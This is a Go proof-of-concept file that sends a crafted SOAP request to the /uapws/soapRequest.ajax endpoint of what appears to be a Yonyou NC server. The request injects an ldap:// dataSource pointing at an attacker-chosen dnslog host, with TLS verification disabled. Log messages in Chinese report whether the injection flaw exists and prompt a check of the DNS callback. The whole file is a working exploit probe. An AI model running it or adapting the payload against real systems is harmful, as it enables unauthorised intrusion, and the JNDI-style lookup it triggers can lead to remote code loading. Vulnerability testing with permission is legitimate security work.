package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
)

func SoapRequestXml(target string, dnslog string) {
	urlPath := strings.TrimRight(target, "/")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	payload := []byte("ws=nc.itf.msgcenter.IMsgCenterWebService&soap=" + url.QueryEscape("<?xml version=\"1.0\" encoding=\"UTF-8\"?><env:Envelop xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:sn=\"http://msgcenter.itf.nc/IMsgCenterWebService\">\n  <env:Header/>\n  <env:Body>\n    <sn:uploadAttachment>\n      <dataSource>ldap://"+dnslog+"/Test</dataSource>\n      <msgtype>?</msgtype>\n      <pk_sourcemsg>?</pk_sourcemsg>\n      <filename>?</filename>\n      <file>?</file>\n    </sn:uploadAttachment>\n  </env:Body>\n</env:Envelop>"))
	reqCmd, err := http.NewRequest("POST", urlPath+"/uapws/soapRequest.ajax", bytes.NewBuffer(payload))
	if err != nil {
		log.Println("[-] Failed to create request:", err)
	}

	reqCmd.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(reqCmd)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Println(err)
	}
	reg := regexp.MustCompile("\"soapResponse\":..([^\\\"]+)")
	msg := reg.MatchString(string(body))
	if resp.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在SoapRequestXML注入漏洞，请检测dnslog回显")
	} else {
		log.Println("[-] 不存在SoapRequestXML注入漏洞")
	}
}
